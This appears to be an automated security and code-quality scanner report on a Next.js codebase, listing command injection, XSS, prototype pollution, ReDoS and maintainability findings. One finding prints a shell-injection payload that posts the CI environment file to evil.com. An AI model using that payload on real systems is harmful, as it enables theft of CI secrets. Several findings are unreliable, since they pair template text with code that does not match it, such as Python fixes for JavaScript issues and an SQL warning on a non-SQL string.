findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/code_freeze.yml`
**Line**: 45

**Vulnerable pattern detected**: `${{ github.event.inputs.type  }}`

**Code**:
```yaml
- run: node ./scripts/code-freeze.js --type ${{ github.event.inputs.type }}
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.type  }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
findings.why_it_matters: Command injection in CI/CD pipelines can lead to complete repository compromise, secrets theft, and supply chain attacks affecting all users of your software.

findings.title: Insecure deserialization: JSON.parse
findings.description:
Deserializing user-controlled data with JSON.parse can lead to Remote Code Execution.

**Analysis:**
🔧 Method: JSON.parse
⚠️ Risk: Generally safe but may cause issues with __proto__
📦 In function: `handler` (1 callers)
🌐 In route handler (receives user input directly)
findings.suggested_fix: Validate schema before deserializing user input.
findings.why_it_matters:
Insecure deserialization can allow attackers to:
• Execute arbitrary code on the server
• Bypass authentication
• Perform denial of service
• Access sensitive data

findings.title: Potential SQL Injection (CWE-89)
findings.description:
**Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: packages/create-next-app/index.ts:711

**Code snippet**:
```javascript
const updateMessage = `${global[packageManager]} create-next-app${pkgTag}`
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `:file((?!\\.well-known(?:`
📦 In function: `loadCustomRoutes` (4 callers)
⚠️ Function appears to process user input
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `:notfile((?!\\.well-known(?:`
📦 In function: `loadCustomRoutes` (4 callers)
⚠️ Function appears to process user input
🎯 User input detected in context
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Prototype pollution: Object.assign merge
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
⚠️ User input from: `req.headers`
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Insecure `Math.random()` used for cryptographic operation
findings.description:
`Math.random()` is not cryptographically secure and can be predicted by attackers.

**Analysis:**
🎯 Used for: cryptographic operation
📦 In function: `createOpaqueFallbackRouteParams`
findings.why_it_matters: Insecure random number generators (like Math.random or random.random) use predictable algorithms. Attackers can often guess the output and forge tokens, guess passwords, or bypass authentication.

findings.title: Architectural Bottleneck: eval (architectural hub)
findings.description:
[COMPOUND: 3 co-located issues] Function 'eval' is called by 202 functions and has complexity 65. Changes here are high-risk.

Betweenness centrality: 0.0806 - this function sits on many execution paths between other functions.

📊 Threshold: 20 (adaptive) | Actual: 65 | Default would be: 20 | Profile: p90=9, p95=15, mean=4.4, n=23362
findings.suggested_fix: This is a critical hub. Ensure comprehensive test coverage, add defensive error handling, and consider circuit breaker pattern.
findings.why_it_matters: Bottlenecks are single points of failure that amplify bugs. High fan-in with high complexity means many callers depend on risky code.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: apps/bundle-analyzer/app/layout.tsx:27

**Code snippet**:
```
dangerouslySetInnerHTML={{
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Hook called conditionally: `useState`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useState`
📦 Component: `Home`
⚠️ Called inside `if/else/switch/ternary`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Test code in production: 4 issues
findings.description:
[COMPOUND: 3 co-located issues] Test utilities and patterns found in what appears to be production code.

**Found:**
• Test fixtures (lines 6, 7, 8, 56)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Empty catch block swallows exceptions

**Risk Assessment:**
⚠️ `genAsyncRequest` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Mutual recursion: 2 functions in call cycle (complexity 38)
findings.description: Mutual recursion detected: 2 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/crates/next-code-frame/src/highlight.rs::impl<Scanner<'_>>::scan:767 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/crates/next-code-frame/src/highlight.rs::impl<Scanner<'_>>::scan_template:680. Aggregate complexity: 38.
findings.suggested_fix: Consider refactoring to eliminate direct mutual calls. Common strategies: merge the two functions, use a callback parameter, or introduce a shared data structure that both functions operate on.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Blocking call `readFileSync` in async function
findings.description: Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Test code in production: 6 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test assertions (lines 54, 70, 90, 115, 116, 135)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: examples/blog-starter/src/app/_components/post-body.tsx:12

**Code snippet**:
```
dangerouslySetInnerHTML={{ __html: content }}
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Global mutable variable: butter
findings.description:
[COMPOUND: 2 co-located issues] Global mutable state 'butter' makes code hard to reason about.

**Impact Analysis:**
📊 Used 9 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getButter()`, `setButter()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Test code in production: 4 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (lines 5, 7, 11, 15)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Global mutable variable: store
findings.description:
Global mutable state 'store' makes code hard to reason about.

**Impact Analysis:**
📊 Used 11 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getStore()`, `setStore()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

**Found:**
• Mock/stub objects (line 8)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Blocking call `readFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `fetchFontFile`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: packages/next-codemod/transforms/cra-to-next.ts:246

**Code snippet**:
```
serializedAttrs += ` dangerouslySetInnerHTML={{ __html: \`${gatherTextChildren(
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Hook called inside a loop: `useFoo`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useFoo`
⚠️ Called inside `for/while/map/forEach`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Prototype pollution: Object.assign merge
findings.description:
[COMPOUND: 2 co-located issues] Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
🌐 Function receives external data via route handler
📦 In function: `matchDynamicRoute` (2 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Global mutable variable: cacheExports
findings.description:
Global mutable state 'cacheExports' makes code hard to reason about.

**Impact Analysis:**
📊 Used 17 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getCacheExports()`, `setCacheExports()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Async call without await
findings.description:
[COMPOUND: 2 co-located issues] Async function called without await - returns Promise/coroutine, not the actual value.

**Analysis:**
📦 In async function: `main`
🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

findings.title: Callback hell (8 levels deep)
findings.description:
Deeply nested callbacks (8 levels) make code hard to follow.

**Analysis:**
✓ File already uses async/await in some places
⚠️ 13 .then() chains detected
⚠️ 11 anonymous functions - consider naming them
findings.suggested_fix:
This file already uses async/await. Convert remaining callbacks:
1. Replace `.then()` chains with `await`
2. Use `try/catch` instead of `.catch()`
findings.why_it_matters: The 'pyramid of doom' hurts readability and makes error handling difficult. Each nesting level increases cognitive load.

findings.title: Excessive nesting: 11 levels in nextPageConfig
findings.description:
11 levels of nesting (threshold: 6).

**Analysis:**
In function: `nextPageConfig`
High complexity: 27 (nesting compounds this)

Threshold: 5 (adaptive) | Actual: 11 | Default would be: 5 | Profile: p90=3, p95=4, mean=1.4, n=23362
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `loadConfig` appears to do I/O
📊 `loadConfig` is complex (31 internal calls)
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Blocking call `readFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `handleCJS`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Mutual recursion: 3 functions in call cycle (complexity 41)
findings.description: Mutual recursion detected: 3 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/build/swc/index.ts::loadBindingsSync:393 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/build/swc/index.ts::loadNative:1485 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/build/swc/index.ts::transformSync:1744. Aggregate complexity: 41.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `readFile` appears to do I/O
⚠️ `writeFile` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Weak hash algorithm (MD5/SHA1)
findings.description: MD5 and SHA1 are cryptographically broken.
findings.suggested_fix: Use SHA-256 or better (SHA-3, BLAKE3).
findings.why_it_matters: Weak hashes can be cracked or collided.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (line 90)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: packages/next/src/client/components/builtin/app-error.tsx:11

**Code snippet**:
```
<style dangerouslySetInnerHTML={{ __html: errorThemeCss }} />
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: XSS: innerHTML assignment
findings.description:
**Direct innerHTML assignment can lead to XSS vulnerabilities**

**Location**: packages/next/src/client/head-manager.ts:11

**Code snippet**:
```
el.innerHTML = dangerouslySetInnerHTML.__html || ''
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Mutual recursion: 4 functions in call cycle (complexity 58)
findings.description: [COMPOUND: 2 co-located issues] Mutual recursion detected: 4 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/client/index.tsx::doRender:616 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/client/index.tsx::render:798 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/client/index.tsx::renderError:353 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/client/index.tsx::renderReactElement:563. Aggregate complexity: 58.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Prototype pollution: Object.assign merge
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
🌐 Function receives external data via route handler
📦 In function: `makePublicRouterInstance` (2 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Test code in production: 0 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Blocking call `readFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `createSelfSignedCertificate`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `readFile` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: packages/next/src/pages/_document.tsx:241

**Code snippet**:
```
srcProps.dangerouslySetInnerHTML = {
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Prototype pollution: Object.assign merge
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
🌐 Function receives external data via route handler
📦 In function: `apiResolver` (2 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Mutual recursion: 9 functions in call cycle (complexity 140)
findings.description: Mutual recursion detected: 9 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::getPayload:1156 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::renderWithRestartOnCacheMissInValidation:4991 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::run:5231 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::validateAtDepth:4710 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::validateAtDepthImpl:4717 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/app-render/app-render.tsx::validateInstantConfigInBuildWithSample:5361 ... (+3 more). Aggregate complexity: 140.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Hook called inside a loop: `useDynamicRouteParams`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useDynamicRouteParams`
⚠️ Called inside `for/while/map/forEach`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Insecure `Math.random()` used for session/authentication
findings.description:
`Math.random()` is not cryptographically secure and can be predicted by attackers.

**Analysis:**
🎯 Used for: session/authentication
findings.why_it_matters: Insecure random number generators (like Math.random or random.random) use predictable algorithms. Attackers can often guess the output and forge tokens, guess passwords, or bypass authentication.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `fetch` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: God class detected: HotReloaderWebpack
findings.description:
Class 'HotReloaderWebpack' shows signs of being a god class: high method count (22), very large class (1663 LOC).

**Role Analysis:** Application — Standard application class

**Metrics:**
- Methods: 22
- Total complexity: 1
- Lines of code: 1663

📊 Threshold: 20 (adaptive) | Actual: 22 | Default would be: 20 | Profile: p90=1, p95=3, mean=0.5, n=5030
findings.suggested_fix:
Refactor 'HotReloaderWebpack' to reduce its responsibilities:
**Note:** This class was identified as Application (Standard application class). Thresholds adjusted accordingly.

1. **Extract related methods into separate classes**
- Look for method groups that work with the same data
- Create focused classes with single responsibilities
3. **Break down the large class (1663 LOC)**
- Split into smaller, focused classes
- Consider using composition over inheritance
- Extract data classes for complex state

**Apply SOLID principles:**
- Single Responsibility: Each class should have one reason to change
- Open/Closed: Extend behavior without modifying existing code
- Interface Segregation: Create specific interfaces
- Dependency Inversion: Depend on abstractions
findings.why_it_matters: God classes violate the Single Responsibility Principle. They are difficult to understand, test, and maintain. Changes to one part may unexpectedly affect other parts, leading to bugs and technical debt.

findings.title: Excessive nesting: 11 levels in start
findings.description:
11 levels of nesting (threshold: 6).

**Analysis:**
In function: `start`
High complexity: 167 (nesting compounds this)
Existing helpers that could reduce nesting: afterCompile, clean, refreshServerComponents

Threshold: 5 (adaptive) | Actual: 11 | Default would be: 5 | Profile: p90=3, p95=4, mean=1.4, n=23362
findings.suggested_fix:
This function already has helpers like `afterCompile`. Consider:
1. Extract more nested blocks into similar helpers
2. Use guard clauses (early returns) to reduce nesting
3. Replace nested ifs with switch/match
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Test code in production: 0 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

